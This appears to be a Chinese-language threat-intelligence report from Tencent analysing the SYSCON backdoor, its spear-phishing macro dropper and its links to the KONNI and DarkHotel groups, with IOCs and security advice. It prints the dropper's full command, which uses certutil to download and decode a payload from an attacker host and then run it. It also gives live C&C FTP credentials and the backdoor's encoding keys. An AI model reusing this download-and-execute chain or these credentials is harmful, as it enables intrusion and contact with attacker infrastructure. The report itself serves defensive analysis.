## 一、背景

 **腾讯御见威胁情报中心曾在9月底发布了《DarkHotel
APT组织揭秘：针对高端商务人士、政要人物的精准攻击已持续8年》，分析报告提到的后门程序SYSCON/SANNY是专门针对朝鲜半岛相关的政治目标进行攻击的恶意文件，其主要攻击目标为朝鲜半岛相关的重要政治人物或者要害部门，偶尔也会针对东南亚等国进行攻击。**

通过分析发现，该后门跟DarkHotel的TTPs相吻合，因此我们把该后门归结为DarkHotel（黑店）APT组织。该后门从2017年下半年开始活跃，并且对多个目标进行了攻击活动，而该后门的最早的攻击历史可以追溯到2012年。

腾讯御见威胁情报中心对该后门进行了长期跟踪，发现 **该后门一直以来的特色就是使用FTP协议进行C
&C通信，并且有很强的躲避技术和绕UAC技术**。而最新版本的后门采用了多阶段执行、云控、绕最新UAC等技术，使得攻击更加的隐蔽和难以发现。

##  **二、最新活动分析**

腾讯御见威胁情报中心在2018年8月捕获到两个疑似APT的攻击样本，经过对样本的深入分析和腾讯御见威胁情报平台的关联分析，确认了该次攻击属于DarkHotel的SYSCON后门。

###  **1.攻击诱饵**

本次攻击活动，依然采用最常见的鱼叉攻击的方式，攻击的诱饵有两个，均和朝鲜半岛问题相关。

 **诱饵一：Predict what’s next after Singapore summit**  

![1.png](https://image.3001.net/images/20181019/1539911651_5bc92fe31a5c5.png!small)

 **诱饵二：Pompeo tells China continued North Korea sanctions enforcement needed**  

![2.png](https://image.3001.net/images/20181019/1539911689_5bc930096430a.png!small)

###  **2.整体攻击流程：**  

![3.png](https://image.3001.net/images/20181019/1539911705_5bc9301915ab0.png!small)

### **3.Dropper分析**

本次攻击，使用了最为传统的宏代码。为了诱使被攻击者打开宏，特意将诱饵文档中的字体修改成非常浅的颜色使用户无法阅读，而启用宏后会显示为方便阅读的黑色。

![4.png](https://image.3001.net/images/20181019/1539911721_5bc930296dcbb.png!small)

除此，与以往的攻击相比，本次攻击的大部分代码放到云端，在VBA脚本中只保留非常简单的几行代码，把以往在VBA中的大部分代码被放到<http://bluemountain.1apps.com/1.txt>
中，通过将其下载并存为1.bat执行。云控化的安装过程使得木马的传播和感染过程灵活可控。

宏代码：  

![5.png](https://image.3001.net/images/20181019/1539911739_5bc9303b3732b.png!small)

> C:\Windows\system32\cmd.exe /q /c copy /Y %windir%\System32\certutil.exe
> %TEMP%\ct.exe && cd /d %TEMP% && ct -urlcache -split -f
> <http://bluemountain.1apps.com/1.txt> && ct -decode -f 1.txt 1.bat && del /f
> /q 1.txt && 1.bat

有意思的是，VBA将Microsoft Windows
certutil.exe程序复制到％temp％目录，并命名为ct.exe。以此来逃避一些安全软件的检测规则。  
  
而上面url的内容，是存储着假冒的PEM编码的SSL证书，然后使用certutil.exe来解码其中的base64代码（去除BEGIN和END标记）。  

![6.png](https://image.3001.net/images/20181019/1539911756_5bc9304c5f853.png!small)

解码后的1.bat的内容如下：  

![7.png](https://image.3001.net/images/20181019/1539911770_5bc9305ae861e.png!small)

1.bat的主要功能是主要根据系统类型下载cab文件到本地展开执行，实现木马的安装。与以往不同的是，本次攻击将CAB压缩包也存放在云端，并将CAB压缩包文件分为两个放在云端，由bat脚本判断本地系统后按需进行下载。

而以往的攻击样本则是将x64、x86两种版本木马程序放在同一个cab压缩包中且直接存放在诱饵文档中，无需联网安装。其他安装过程包括绕过UAC方式等和以往相同。

###  **4.后门核心功能分析**

本次使用的SYSCON后门依然使用FTP协议进行控制，这也是该后门最大的特点，木马首先会读取同目录下的同名ini文件，并将其解密得到C&C的地址，以及使用的FTP用户名和密码。这种通过ini文件来控制C&C地址的做法在DarkHotel组织的多个木马中用到。  

![8.png](https://image.3001.net/images/20181019/1539911788_5bc9306c81776.png!small)

解密出配置信息后，通过运行systeminfo和tasklist命令来收集系统信息，收集后输出到temp.ini，并压缩上传到C&C中，上传的文件名格式为to
+ 计算机名 + 时间。

FTP信息为：

> FTP Server：ftp.byethost7.com  
> UserName：b7_22605488  
> PASS WORD：123qweASD!@#

![9.png](https://image.3001.net/images/20181019/1539911807_5bc9307f84215.png!small)

上传systeminfo 、tasklist结果到C&C，然后查找C&C上的名为to everyone 的文件，读取内容解密后得到命令进行命令分发。  

![10.png](https://image.3001.net/images/20181019/1539911890_5bc930d28814d.png!small)

相关命令如下：  

![11.png](https://image.3001.net/images/20181019/1539911912_5bc930e8e7656.png!small)

## **三、关联分析**

###  **1.本次木马和SYSCON关系**  

本次木马与SYSCON无论是核心代码结构，还是部分加密方式均有极大相似性，都与SYSCON木马有着极大的相似性，可以确定此木马就是SYSCON。  

C&C的ini文件加密算法对比（下图为SYSCON），为Base64加密 ：  

![12.png](https://image.3001.net/images/20181019/1539911938_5bc93102bed8b.png!small)

本次发现的木马 ：  

![13.png](https://image.3001.net/images/20181019/1539911958_5bc93116860f5.png!small)

值得注意的是加密使用的密钥已经发生改变，SYSCON之前使用的密钥为：

> KXU/yP=B29tLzidqNRuf-SbVInw0oCrmWZk6OpFc7A5GTD1QxaJ3H8h4jMeEsYglv

而本次攻击使用的密钥已经更新为：

> bVICrm9xaJ3tZX-Tj6OpFc7Asi4lvuhfw0oQ5GKeEHYgD1MLRn=BU/dqNP2kWyz8S

之前的SYSCON的密钥：  

![14.png](https://image.3001.net/images/20181019/1539911982_5bc9312eee1bb.png!small)

更新后的密钥：  

![15.png](https://image.3001.net/images/20181019/1539912006_5bc93146bae89.png!small)

从木马获取到本机信息后打包压缩上传的相关代码来分析可见，核心功能代码并未改变，但大部分API函数改为了动态调用。

压缩上传相关代码（下图为SYSCON）：  

![16.png](https://image.3001.net/images/20181019/1539912029_5bc9315d195d2.png!small)

本次发现的样本：

![17.png](https://image.3001.net/images/20181019/1539912064_5bc9318028210.png!small)

因此我们确认，该后门即为SYSCON后门。  

### **2.SYSCON和KONNI关系**

经过深入的分析发现， **该后门跟另一款针对朝鲜等政治人物攻击的后门KONNI有着非常大的相同点** ，因此我们判断，这两款后门，属于一个攻击组织。

 **密钥的关联性：**  
上文提到，SYSCON木马编码加密使用的密钥为：

> KXU/yP=B29tLzidqNRuf-SbVInw0oCrmWZk6OpFc7A5GTD1QxaJ3H8h4jMeEsYglv

该密钥同时被使用到了KONNI的诱饵文档的编码加密中：  

![18.png](https://image.3001.net/images/20181019/1539912111_5bc931afde845.png!small)

**宏代码的关联性：**  
我们从腾讯御见威胁情报库中，找到了之前被其他安全厂商曝光过的KONNI和SYSCON的样本：

确认为KONNI样本：  
834d3b0ce76b3f62ff87b7d6f2f9cc9b 12 things Trump should know about North
Korea.doc

确认为SYSCON样本：  
a0d66962dfc35b0cf49442f8ee6062d3 3131.doc  

经过比较发现，他们的攻击文档中的宏代码，几乎完全一样：  

![19.png](https://image.3001.net/images/20181019/1539912131_5bc931c3e1ce0.png!small)

![20.png](https://image.3001.net/images/20181019/1539912154_5bc931daa1be3.png!small)

此外无论是本次攻击所用的样本，还是老版本的SYSCON或者KONNI木马，他们绝大多数的攻击载体为word文件，通过在word文档中嵌入恶意宏代码来实现攻击。为了诱使用户启用宏，该组织最常用的方式就是将字体修改成非常浅的颜色使用户无法阅读，而启用宏后会将字体颜色改成黑色。  

本次攻击文档中修改字体颜色的VBA代码：  

![21.png](https://image.3001.net/images/20181019/1539912176_5bc931f025c55.png!small)

KONNI的修改字体的代码：  

![22.png](https://image.3001.net/images/20181019/1539912194_5bc932021dbc0.png!small)

**攻击对象的关联性**  
从攻击的诱饵文件来看，无论是SYSCON还是KONNI，语言一般是英文，偶尔有诱饵采用俄文。而诱饵内容均为和朝鲜相关。

###  **3.KONNI和DarkHotel关系**

继续从腾讯御见威胁情报样本库里查找样本，发现某个KONNI的诱饵文件（b9ba36607ea379da4b6620c4e3fce2ca）内容如下：  
PYONGYANG E-MAIL LISTS –April 2017  

![23.png](https://image.3001.net/images/20181019/1539912212_5bc93214c1be8.png!small)

而确认为Darkhotel的Inexsmar后门的某一次诱饵文件（9d1f784766ec154645bdf33cad211048）为：  
PYONGYANG E-MAIL LISTS –September2016  

![24.png](https://image.3001.net/images/20181019/1539912232_5bc9322842e01.png!small)

可以看到，两个诱饵文件无论是标题和内容都极其相似。  

同时，我们可以看到，两个诱饵的文档的作者，均为Divya Jacob。  

![25.png](https://image.3001.net/images/20181019/1539912275_5bc93253266e2.png!small)![26.png](https://image.3001.net/images/20181019/1539912295_5bc93267c3883.png!small)

而此外，两个文件都为scr格式，并且都伪装成了word的图标，且运行后都会运行相应的docx文档。因此从攻击方式来看也非常相似。

综上，我们判断，KONNI跟DarkHotel也存在一定的关联。

##  **四、总结**

SYSCON后门是专门针对朝鲜半岛问题相关的政治人物的特种木马，只要跟朝鲜半岛相关的人物和单位/部门，均为他的攻击目标。

虽然暂未发现该木马活跃在中国境内，但是鉴于中国和朝鲜半岛特殊又密切的关系，不排除该后门会对中国相关领域关键人物和单位进行攻击，腾讯御见威胁情报中心提醒有关人员切不可掉以轻心。

此外，经过溯源和关联发现，该后门跟KONNI和Inexsmar后门都存在千丝万缕的关系，经过详细技术分析，我们把该后门归属到DarkHotel（黑店）APT组织。

## **五、安全建议**

谨慎连接公用的WiFi网络。若必须连接公用WiFi网络，建议：

> 不要进行可能泄露机密信息或隐私信息的操作，如收发邮件、IM通信、银行转账等；
>
> 不要在连接公用WiFi时进行软件升级操作；
>
> 不要打开不明来源的邮件附件；
>
> 及时打系统补丁和重要软件的补丁；
>
> 使用杀毒软件防御可能的病毒木马攻击。

使用腾讯御界高级威胁检测系统。御界高级威胁检测系统，是基于腾讯反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。

![27.png](https://image.3001.net/images/20181019/1539912323_5bc93283604d8.png!small)

##  **六、附录（IOCs）**

 **MD5：**

2730e5e390cb1f579e73911edf91b04b  
468f0d5e987430384e4e8220df2e8584  
7027beade93ba6a422afed75eb7663f9  
cec4001f640f8993895a7cda682479a4  
7ce575c0e23d82658027715a398ce016  
  
**domain：**  
<http://bluemountain.1apps.com>  
<http://www.webmail-koryogroup.com>  
ftp.byethost7.com  
ftp.byethost11.com  
ftp.byethost31.com

## **参考链接：**

[《DarkHotel
APT组织揭秘：针对高端商务人士、政要人物的精准攻击已持续8年》](https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&mid=2247486327&idx=1&sn=87615e0d8af225c4137b32304c85d9a8&scene=21#wechat_redirect)

 ***本文作者：腾讯电脑管家，转载请注明来自FreeBuf.COM**

